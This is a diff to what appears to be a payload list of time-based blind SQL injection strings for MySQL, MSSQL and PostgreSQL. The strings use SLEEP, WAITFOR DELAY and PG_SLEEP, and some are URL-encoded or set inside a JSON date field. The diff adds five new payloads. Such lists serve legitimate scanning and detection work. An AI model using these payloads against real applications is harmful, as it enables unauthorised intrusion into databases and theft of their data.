@@ -2,11 +2,16 @@ vTdvHgFAMBvEJ'); waitfor delay '0:0:6' --
 OR NOT 04806=4806-- wXyW
 (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v) 
 AND (SELECT 1234 FROM (SELECT(SLEEP(5)))a)
+-1' OR 1*6*1=6 AND 000805=000805 or 'gQV28g4R'='
+1'XOR(94102*if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
+"startDate": "2025-04-03d' AND 1=(SELECT 1 FROM PG_SLEEP(10)) OR '1'='0
+''||(select 1 from (select pg_sleep(6))x)||'
 1 AND (SELECT 1234 FROM (SELECT(SLEEP(5)))a)
 10'XOR(1*if(now()=sysdate(),sleep(6),0))XOR'Z
  ')waitfor%20delay'0%3a0%3a10'--
 (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%22%2B(select(0)from(select(sleep(6)))v)%2B%22*/
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(25),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z 
